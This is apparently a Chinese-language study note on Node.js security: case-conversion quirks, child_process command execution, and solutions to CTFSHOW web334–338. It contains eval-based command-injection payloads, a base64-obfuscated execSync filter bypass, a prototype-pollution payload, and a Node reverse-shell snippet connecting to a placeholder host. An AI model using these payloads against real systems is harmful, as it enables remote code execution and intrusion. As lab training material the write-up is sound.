# Nodejs安全

[TOC]

---

## 复现学习

### js大小写转换

> Fuzz中的javascript大小写特性https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html

```javascript
if (!String.fromCodePoint) {
	(function() {
		var defineProperty = (function() {
			// IE 8 only supports `Object.defineProperty` on DOM elements
			try {
				var object = {};
				var $defineProperty = Object.defineProperty;
				var result = $defineProperty(object, object, object) && $defineProperty;
			} catch(error) {}
			return result;
		}());
		var stringFromCharCode = String.fromCharCode;
		var floor = Math.floor;
		var fromCodePoint = function() {
			var MAX_SIZE = 0x4000;
			var codeUnits = [];
			var highSurrogate;
			var lowSurrogate;
			var index = -1;
			var length = arguments.length;
			if (!length) {
				return '';
			}
			var result = '';
			while (++index < length) {
				var codePoint = Number(arguments[index]);
				if (
					!isFinite(codePoint) || // `NaN`, `+Infinity`, or `-Infinity`
					codePoint < 0 || // not a valid Unicode code point
					codePoint > 0x10FFFF || // not a valid Unicode code point
					floor(codePoint) != codePoint // not an integer
				) {
					throw RangeError('Invalid code point: ' + codePoint);
				}
				if (codePoint <= 0xFFFF) { // BMP code point
					codeUnits.push(codePoint);
				} else { // Astral code point; split in surrogate halves
					// http://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
					codePoint -= 0x10000;
					highSurrogate = (codePoint >> 10) + 0xD800;
					lowSurrogate = (codePoint % 0x400) + 0xDC00;
					codeUnits.push(highSurrogate, lowSurrogate);
				}
				if (index + 1 == length || codeUnits.length > MAX_SIZE) {
					result += stringFromCharCode.apply(null, codeUnits);
					codeUnits.length = 0;
				}
			}
			return result;
		};
		if (defineProperty) {
			defineProperty(String, 'fromCodePoint', {
				'value': fromCodePoint,
				'configurable': true,
				'writable': true
			});
		} else {
			String.fromCodePoint = fromCodePoint;
		}
	}());
}
for (var j = 'A'.charCodeAt(); j <= 'Z'.charCodeAt(); j++){
	var s = String.fromCodePoint(j);
	for (var i = 0; i < 0x10FFFF; i++) {
		var e = String.fromCodePoint(i);
		if (s == e.toUpperCase() && s != e) {
			document.write("char: "+e+"<br/>");
	};
};
}
```

输出结果：
```javascript
char: a
char: b
char: c
char: d
char: e
char: f
char: g
char: h
char: i
char: ı
char: j
char: k
char: l
char: m
char: n
char: o
char: p
char: q
char: r
char: s
char: ſ
char: t
char: u
char: v
char: w
char: x
char: y
char: z
```

对于`toUpperCase()` 函数*`ı`--->I,`ſ`---->S*

改成小写之后：
```javascript
char: A
char: B
char: C
char: D
char: E
char: F
char: G
char: H
char: I
char: J
char: K
char: K
char: L
char: M
char: N
char: O
char: P
char: Q
char: R
char: S
char: T
char: U
char: V
char: W
char: X
char: Y
char: Z
```

"K".toLowerCase() == 'k'



### 环境变量

```javascript
// 模块相关
__dirname    // 当前模块的目录名
__filename   // 当前模块的文件名（包含完整路径）
exports      // module.exports 的简写引用
module       // 当前模块的引用
require()    // 用于导入模块

// 进程相关
process      // 提供当前 Node.js 进程信息和控制能力
  // 常用属性和方法：
  process.env         // 环境变量
  process.argv        // 命令行参数
  process.cwd()       // 当前工作目录
  process.exit()      // 退出当前进程
  process.nextTick()  // 下一个事件循环触发回调函数

// 定时器函数
setTimeout()
setInterval()
setImmediate()
clearTimeout()
clearInterval()
clearImmediate()

// 控制台
console.log()
console.error()
console.warn()
console.time()
console.timeEnd()
```

### nodejs中的命令执行

> Node.js 提供了 `child_process` 模块来执行系统命令。常用的方法有 `exec`、`execSync`、`spawn` 和 `spawnSync`

#### exec

基本语法：`exec` 用于异步执行命令，并将结果以回调函数的形式返回。

```javascript
const { exec } = require('child_process');
exec(command[, options][, callback]);
```

例如执行`ls -l`

```javascript
const { exec } = require('child_process');

exec('ls -l', (error, stdout, stderr) => {
    if (error) {
        console.error(`执行错误: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`标准错误输出: ${stderr}`);
        return;
    }
    console.log(`标准输出:\n${stdout}`);
});
```



#### execSync

`execSync` 用于同步执行命令，并返回命令的输出,返回命令的标准输出（默认是 `Buffer` 类型，可以通过 `encoding` 选项设置为字符串）

基本语法：

```javascript
const { execSync } = require('child_process');

const output = execSync(command[, options]);
```

还是那个例子

```javascript
const { execSync } = require('child_process');

try {
  const output = execSync('ls -l', { encoding: 'utf-8' });
  console.log(`标准输出:\n${output}`);
} catch (error) {
  console.error(`执行错误: ${error.message}`);
}
```



#### spawn

`spawn` 用于异步执行命令，并以流的形式返回输出。适合处理大量数据或流式数据

```javascript
const { spawn } = require('child_process');

const child = spawn(command[, args][, options]);
```

`ls -l`example

```javascript
const { spawn } = require('child_process');

const child = spawn('ls', ['-l']);

child.stdout.on('data', (data) => {
  console.log(`标准输出:\n${data}`);
});

child.stderr.on('data', (data) => {
  console.error(`标准错误输出:\n${data}`);
});

child.on('close', (code) => {
  console.log(`子进程退出，退出码: ${code}`);
});
```

> `child_process`模块中所有函数都是基于`spawn`和`spawnSync`函数的来实现的，换句话来说，`spawn`和`spawnSync`函数的配置是最完全的，其它函数都是对其做了封装和修改。



## CTFSHOW-nodejs

### web334

就是代码审计，知道`finduser`

```javascript
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
};
```

同时的话，user.js

```javascript
module.exports = {
  items: [
    {username: 'CTFSHOW', password: '123456'}
  ]
};
```

根据逻辑ctfshow即可得到flag

![image-20250131143121976](https://gitee.com/bx33661/image/raw/master/path/image-20250131143121976.png)



### web335

查看源码可以发现eval危险函数

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CTFFSHOW</title>
    <script type="text/javascript" src="/javascripts/jquery.js"></script>
</head>
<body>
    where is flag?  
    <!-- /?eval= -->

</body>
</html>
```

直接rce：

```javascript
?eval=require('child_process').spawnSync('ls',['.']).stdout.toString()
?eval=require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString()
```



### web336

跟上一题一样，过滤了`exec`

1. 可以继续使用spawnSync
2. 绕过过滤

```javascript
/?eval=eval(Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgZmwwMDFnLnR4dCcp",'base64').toString('ascii'))

require('child_process').execSync('ls').toString()

/?eval=require('fs').readFileSync('fl001g.txt','utf-8')
```



1. 可以使用弹shell

```javascript
(function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(3366, "xxxxx", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```



### web337

```javascript
var express = require('express');
var router = express.Router();
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }
  
});

module.exports = router;
```

MD5比较

```(空)
/?a[]=1&b=1
```



### web338

> 题目给了源码

`login.js`重要代码如下

```javascript
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
  
  
});
```

`common.js`

```javascript
module.exports = {
  copy:copy
};

function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
```

这题最好的理解如下，摘抄至别处

> 这里的 `secert` 是一个数组，然后 `utils.copy(user,req.body);` 操作是 `user` 也是数组，也就是我们通过 `req.body` 即 POST 请求体传入参数，通过 `user` 污染数组的原型，那么 `secert` 数组找不到 `ctfshow` 属性时，会一直往原型找，直到在数组原型中发现 `ctfshow` 属性值为 `36dboy` 。那么 `if` 语句即判断成功，就会输出 flag 了。

所以我们的payload如下：
```javascript
{
    "__proto__": {
        "ctfshow": "36dboy"
    }
}
```



![image-20250131165241660](https://gitee.com/bx33661/image/raw/master/path/image-20250131165241660.png)









## synk

那第339题为例子

![image-20250131170751346](https://gitee.com/bx33661/image/raw/master/path/image-20250131170751346.png)
